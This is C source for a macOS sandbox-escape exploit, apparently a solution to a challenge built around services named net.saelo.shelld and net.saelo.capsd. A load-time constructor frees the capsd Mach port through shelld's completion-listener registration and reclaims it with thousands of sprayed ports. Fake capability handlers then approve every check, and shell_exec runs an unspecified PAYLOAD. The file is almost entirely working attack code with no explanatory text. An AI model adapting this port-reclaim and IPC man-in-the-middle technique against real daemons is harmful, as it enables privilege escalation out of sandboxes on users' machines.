#include <bootstrap.h>
#include <os/log.h>
#include <stdio.h>
#include <stdlib.h>
#include <xpc/xpc.h>

#include <mig/shelld.h>
#include <mig/shelld_client.h>

#include <common/utils.h>
#include <common/decls.h>

boolean_t capsd_server(
		mach_msg_header_t *InHeadP,
		mach_msg_header_t *OutHeadP);

kern_return_t grant_capability(mach_port_t server, audit_token_t token, audit_token_t target, const char* operation, const char* arg) {
    return KERN_SUCCESS;
}

kern_return_t has_capability(mach_port_t server, pid_t pid, const char* operation, const char* arg, int* out) {
    puts("[+] IPC MitM successful!");
    *out = 1;
    return KERN_SUCCESS;
}

__attribute__((constructor))
void _injection() {
    puts("[*] Starting sandbox escape");

    mach_port_t bootstrap_port, shelld_port, capsd_port;
    task_get_special_port(mach_task_self(), TASK_BOOTSTRAP_PORT, &bootstrap_port);
    kern_return_t kr = bootstrap_look_up(bootstrap_port, "net.saelo.shelld", &shelld_port);
    ASSERT_SUCCESS(kr, "bootstrap_look_up");

    kr = bootstrap_look_up(bootstrap_port, "net.saelo.capsd", &capsd_port);
    ASSERT_SUCCESS(kr, "bootstrap_look_up");

    char session[4096];
    memset(session, 'A', sizeof(session));
    session[sizeof(session) -1] = 0;

    shelld_create_session(shelld_port, session);

    register_completion_listener(shelld_port, "non_existing_session", capsd_port);
    puts("[+] freed mach port for net.saelo.capsd");

    puts("[*] trying to reclaim freed mach port...");
    dispatch_queue_t replyQueue = dispatch_queue_create("replyQueue", NULL);
    for (int i = 0; i < 10000; i++) {
        mach_port_t listener, listener_send_right;
        mach_msg_type_name_t aquired_right;

        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &listener);
        mach_port_extract_right(mach_task_self(), listener, MACH_MSG_TYPE_MAKE_SEND, &listener_send_right, &aquired_right);
        register_completion_listener(shelld_port, session, listener_send_right);

        dispatch_source_t source = dispatch_source_create(DISPATCH_SOURCE_TYPE_MACH_RECV, listener, 0, replyQueue);
        dispatch_source_set_event_handler(source, ^{
            dispatch_mig_server(source, MAX_MSG_SIZE, capsd_server);
        });
        dispatch_resume(source);

        kern_return_t kr = shell_exec(shelld_port, session, PAYLOAD);
        if (kr == KERN_SUCCESS) {
            printf("[+] pwned after %d tries!\n", i + 1);
            break;
        }

        dispatch_source_cancel(source);

        unregister_completion_listener(shelld_port, session);
        mach_port_deallocate(mach_task_self(), listener_send_right);
    }
}